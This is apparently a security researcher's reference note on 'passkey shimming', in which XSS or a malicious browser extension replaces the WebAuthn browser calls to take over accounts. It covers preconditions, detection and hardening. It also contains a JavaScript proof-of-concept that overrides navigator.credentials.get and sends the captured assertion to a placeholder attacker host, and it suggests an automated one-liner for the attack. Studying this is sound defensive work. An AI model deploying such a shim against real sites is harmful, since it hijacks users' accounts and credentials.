---
title: WebAuthn passkey shimming via XSS or malicious extension
slug: webauthn-passkey-shim-via-xss
created_utc: 2026-05-14T00:00:00Z
updated_utc: 2026-05-14T00:00:00Z
tags: [technique/dom-xss, technique/webauthn, technique/passkey, technique/ato]
inbound: []
---

# WebAuthn passkey shimming via XSS / malicious extension

DEFCON-33 talk "Passkey Pwned — turning WebAuthn against itself".

## Pattern
Passkeys (WebAuthn) sit behind `navigator.credentials.get()` and
`.create()` browser APIs. The cryptographic side is solid — but the
**JS surface is replaceable**. An attacker with content-script reach
(malicious browser extension, browser-injected userscript, or full
XSS on the target origin) replaces those calls with a shim:

- **On `.get()` (login)**: shim forwards the challenge to attacker's
  server, lets the user solve the bio-auth, captures the assertion
  bytes, replays to log into the attacker's session — full ATO.
- **On `.create()` (registration / "add a new device")**: shim
  silently registers an attacker-owned passkey on the victim's account
  in addition to (or instead of) the user's intended one. Persistent
  account access.

Browser RP-ID protections prevent an attacker on `evil.com` from
asking for a passkey for `victim.com` directly. But XSS on `victim.com`
runs in `victim.com`'s context, so the RP-ID match passes.

## Preconditions
- XSS or full content-script reach on the WebAuthn-protected origin.
- For the create-flow: app allows users to add a new passkey without
  step-up auth.

## Detection
- Audit `navigator.credentials.get` and `navigator.credentials.create`
  call sites — confirm CSP `script-src` strict and no `unsafe-inline`.
- Verify that "add new authenticator" requires step-up (password or
  existing passkey).
- Test add-new-passkey flow with XSS PoC: silently register and
  observe.

## Triggering (PoC sketch)
```js
const origGet = navigator.credentials.get.bind(navigator.credentials);
navigator.credentials.get = async (opts) => {
  // forward original challenge to user device
  const cred = await origGet(opts);
  // exfil the assertion to attacker
  fetch("https://attacker/", {method:"POST", body: JSON.stringify({
    id: cred.id,
    rawId: btoa(String.fromCharCode(...new Uint8Array(cred.rawId))),
    response: { /* clientDataJSON, authenticatorData, signature, userHandle */ }
  })});
  return cred;
};
```

Create-flow shim is symmetric: silently call `create()` with
attacker-generated credential creation options to register attacker
authenticator.

## Bypasses / hardening
- Step-up auth (existing-passkey or password) before adding new
  authenticators.
- Email notifications + 24-hour grace period before new device can
  perform sensitive actions.
- Object.freeze on `navigator.credentials` (defense-in-depth — XSS
  can still re-define).

## Open research idea
JG: "It would be cool to see an exploitation framework — an XSS one-
liner that shims navigator.credentials and registers the attacker's
key automatically. Great PoC for any XSS that lands on a passkey-
enabled origin."

## Seen in the wild
- {date: 2025-08, source: CT Ep 149} — DEFCON 33 "Passkey Pwned".

## References
- DEFCON 33 — Passkey Pwned: turning WebAuthn against itself
- Critical Thinking Podcast Ep 149
